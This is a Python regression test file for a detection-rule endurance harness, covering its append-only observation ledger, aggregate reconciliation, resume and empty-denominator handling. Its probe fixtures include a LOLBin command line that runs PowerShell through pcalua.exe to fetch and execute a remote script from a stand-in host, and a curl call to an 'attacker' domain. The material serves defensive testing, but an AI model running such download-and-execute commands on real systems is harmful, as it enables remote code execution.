"""Regression tests for the per-observation record layer (review R02).

The endurance harness must keep an append-only ledger of raw observations, and
every published aggregate must derive from those records instead of from
running counters.  These tests pin the contract:

* one record per evaluated variant / stage / visit / sweep / benchmark,
* blocked (unclassified) and errored observations preserved but excluded from
  rate denominators,
* aggregates reconcile exactly with the live counters (per target and per
  cluster), and a resume rebuilds from records rather than from rounded
  summaries,
* an empty denominator produces ``None`` -- never 0 or 1.
"""

from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from tools.swarm.endurance_runner import EnduranceRunner
from tools.swarm.models import Variant
from tools.swarm.records import (
    Observation,
    RecordWriter,
    aggregate,
    existing_record_count,
    load_records,
    to_runner_counters,
)


def _patched_synthesis(runner: EnduranceRunner):
    return patch.object(
        runner.synthesizer,
        "synthesize",
        return_value=(
            runner.results_dir / "dummy.md",
            {"cable_id": "DUMMY", "total_evaluations": 0, "resilience_rate": 0.0},
        ),
    )


def _valid_variant(variant_id: str = "probe-test-1") -> Variant:
    return Variant(
        id=variant_id,
        target_type="sigma",
        axis="lolbin_proxy",
        mutation_name="test_probe",
        description="records test probe",
        payload={
            "EventID": 1,
            "ParentImage": "C:\\Windows\\explorer.exe",
            "Image": "C:\\Windows\\System32\\pcalua.exe",
            "CommandLine": "pcalua.exe -a powershell.exe -c \"irm https://cdn.stage.invalid/x.ps1 | iex\"",
            "User": "VICTIM-PC\\analyst",
        },
        cycle=1,
    )


class ObservationRecordTests(unittest.TestCase):
    def test_ledger_is_append_only_and_contiguous(self):
        with tempfile.TemporaryDirectory() as tmp:
            res = Path(tmp)
            with EnduranceRunner(pace_seconds=0.0, serve_workbench=False, results_dir=res) as runner:
                with _patched_synthesis(runner):
                    runner.run(max_cycles=12)

                rows = load_records(res)
                self.assertGreater(len(rows), 0, "no observation records written")
                self.assertEqual(existing_record_count(res, runner.run_id), len(rows))
                self.assertEqual(
                    [row["seq"] for row in rows],
                    list(range(1, len(rows) + 1)),
                    "sequence numbers must be contiguous and append-only",
                )
                kinds = {row["kind"] for row in rows}
                self.assertIn("attack_variant", kinds)
                self.assertIn("campaign_stage", kinds)
                self.assertIn("campaign_summary", kinds)
                self.assertIn("dag_visit", kinds)
                self.assertIn("walk_summary", kinds)
                self.assertIn("telemetry_sweep", kinds)
                self.assertIn("noise_benchmark", kinds)

    def test_writer_appends_without_rewriting(self):
        with tempfile.TemporaryDirectory() as tmp:
            writer = RecordWriter(Path(tmp), "run-test", start_seq=0)
            writer.append(Observation(run_id="run-test", suite="t", kind="attack_variant"))
            first_pass = writer.path.read_bytes()
            writer.append(Observation(run_id="run-test", suite="t", kind="attack_variant"))
            second_pass = writer.path.read_bytes()
            self.assertTrue(second_pass.startswith(first_pass), "existing lines were rewritten")
            self.assertEqual(writer.count, 2)

    def test_records_cover_every_evaluated_variant(self):
        with tempfile.TemporaryDirectory() as tmp:
            res = Path(tmp)
            with EnduranceRunner(pace_seconds=0.0, serve_workbench=False, results_dir=res) as runner:
                with _patched_synthesis(runner):
                    runner.run(max_cycles=12)

                rows = load_records(res)
                sparring = [r for r in rows if r["kind"] == "attack_variant"]
                expected = sum(c["probes"] for c in runner.target_probes.values())
                self.assertEqual(len(sparring), expected)
                for row in sparring:
                    self.assertIn("rule_hash", row)
                    self.assertIn("fixture_hash", row)
                    self.assertTrue(str(row["rule_hash"]).startswith("sha256:"))
                    self.assertTrue(str(row["fixture_hash"]).startswith("sha256:"))

    def test_aggregates_reconcile_with_live_counters(self):
        with tempfile.TemporaryDirectory() as tmp:
            res = Path(tmp)
            with EnduranceRunner(pace_seconds=0.0, serve_workbench=False, results_dir=res) as runner:
                with _patched_synthesis(runner):
                    runner.run(max_cycles=12)

                agg = aggregate(load_records(res))
                counters = to_runner_counters(agg)

                self.assertEqual(counters["total_probes"], runner.total_probes)
                self.assertEqual(counters["critic_approved"], runner.critic_approved)
                self.assertEqual(counters["true_positives"], runner.true_positives)
                self.assertEqual(counters["evasion_gaps"], runner.evasion_gaps)
                expected_clusters = {k: v for k, v in runner.cluster_counts.items() if v}
                self.assertEqual(
                    {k: v for k, v in counters["cluster_counts"].items() if v},
                    expected_clusters,
                )
                self.assertEqual(counters["campaigns_count"], runner.campaigns_count)
                self.assertEqual(counters["campaigns_contained"], runner.campaigns_contained)
                self.assertEqual(counters["graph_walks_count"], runner.graph_walks_count)
                self.assertEqual(counters["graph_walks_contained"], runner.graph_walks_contained)
                self.assertEqual(counters["replay_evals_count"], runner.replay_evals_count)
                self.assertEqual(counters["noise_benchmarks_count"], runner.noise_benchmarks_count)
                self.assertEqual(counters["benign_events"], runner.benign_events)
                self.assertEqual(counters["benign_false_positives"], runner.benign_false_positives)
                for target in ("sigma", "yara"):
                    expected = runner.target_probes[target]
                    bucket = counters["target_probes"][target]
                    for key, runner_key in (
                        ("probes", "probes"),
                        ("approved", "approved"),
                        ("detected", "detected"),
                        ("evaded", "gaps"),
                    ):
                        self.assertEqual(bucket[key], expected[runner_key], f"{target}.{key}")

                state = json.loads((res / "endurance_state.json").read_text(encoding="utf-8"))
                self.assertEqual(state["run_id"], runner.run_id)
                self.assertEqual(
                    state["attack_variants_evaluated"], runner.true_positives + runner.evasion_gaps
                )
                self.assertEqual(state["observation_records"]["count"], agg.n_records)

    def test_blocked_variant_preserved_and_excluded_from_denominator(self):
        with tempfile.TemporaryDirectory() as tmp:
            res = Path(tmp)
            with EnduranceRunner(pace_seconds=0.0, serve_workbench=False, results_dir=res) as runner:
                blocked = _valid_variant("probe-blocked")
                blocked.payload["CommandLine"] = "curl.exe http://live-attacker.example.com/x"
                runner._evaluate_probe(blocked, "Cluster A: LOLBin & Process Proxying")

                rows = load_records(res)
                blocked_rows = [r for r in rows if r["outcome"] == "unclassified"]
                self.assertEqual(len(blocked_rows), 1)
                self.assertEqual(blocked_rows[0]["probe_id"], "probe-blocked")
                agg = aggregate(rows)
                self.assertEqual(agg.unclassified, 1)
                self.assertEqual(agg.attack_evaluated, 0)
                self.assertEqual(agg.gated_considered, 1)
                self.assertEqual(agg.gated_blocked, 1)
                # Empty denominator must be None (not measured), never 0 or 1.
                self.assertIsNone(agg.resilience)
                self.assertIsNone(runner.current_resilience)

    def test_error_outcome_is_preserved(self):
        with tempfile.TemporaryDirectory() as tmp:
            res = Path(tmp)
            with EnduranceRunner(pace_seconds=0.0, serve_workbench=False, results_dir=res) as runner:
                with patch.object(runner.sigma_detector, "evaluate", side_effect=RuntimeError("boom")):
                    with self.assertRaises(RuntimeError):
                        runner._evaluate_probe(_valid_variant("probe-error"), "Cluster A: LOLBin & Process Proxying")

                rows = load_records(res)
                errored = [r for r in rows if r["outcome"] == "error"]
                self.assertEqual(len(errored), 1)
                self.assertEqual(errored[0]["probe_id"], "probe-error")
                agg = aggregate(rows)
                self.assertEqual(agg.errors, 1)
                self.assertEqual(agg.attack_evaluated, 0)
                self.assertIsNone(agg.resilience)

    def test_resume_rebuilds_exactly_from_records(self):
        with tempfile.TemporaryDirectory() as tmp:
            res = Path(tmp)
            with EnduranceRunner(pace_seconds=0.0, serve_workbench=False, results_dir=res) as runner:
                with _patched_synthesis(runner):
                    runner.run(max_cycles=12)
                snapshot = (
                    runner.total_probes,
                    runner.critic_approved,
                    runner.true_positives,
                    runner.evasion_gaps,
                    dict(runner.cluster_counts),
                    runner.campaigns_count,
                    runner.campaigns_contained,
                    runner.graph_walks_count,
                    runner.graph_walks_contained,
                )

                with EnduranceRunner(
                    pace_seconds=0.0, serve_workbench=False, results_dir=res, resume=True
                ) as resumed:
                    self.assertEqual(resumed.run_id, runner.run_id)
                    self.assertEqual(resumed.total_cycles, runner.total_cycles)
                    self.assertEqual(
                        (
                            resumed.total_probes,
                            resumed.critic_approved,
                            resumed.true_positives,
                            resumed.evasion_gaps,
                            dict(resumed.cluster_counts),
                            resumed.campaigns_count,
                            resumed.campaigns_contained,
                            resumed.graph_walks_count,
                            resumed.graph_walks_contained,
                        ),
                        snapshot,
                    )
                    self.assertEqual(resumed._record_start_seq, existing_record_count(res, runner.run_id))

    def test_empty_denominators_are_none(self):
        agg = aggregate([])
        self.assertIsNone(agg.resilience)
        self.assertIsNone(agg.critic_approval_rate)
        self.assertIsNone(agg.containment_rate)
        with tempfile.TemporaryDirectory() as tmp:
            with EnduranceRunner(pace_seconds=0.0, serve_workbench=False, results_dir=Path(tmp)) as runner:
                self.assertIsNone(runner.current_resilience)
                self.assertIsNone(runner.average_dod)
                self.assertIsNone(runner.containment_rate)
                self.assertIsNone(runner.average_mttd)


if __name__ == "__main__":
    unittest.main()
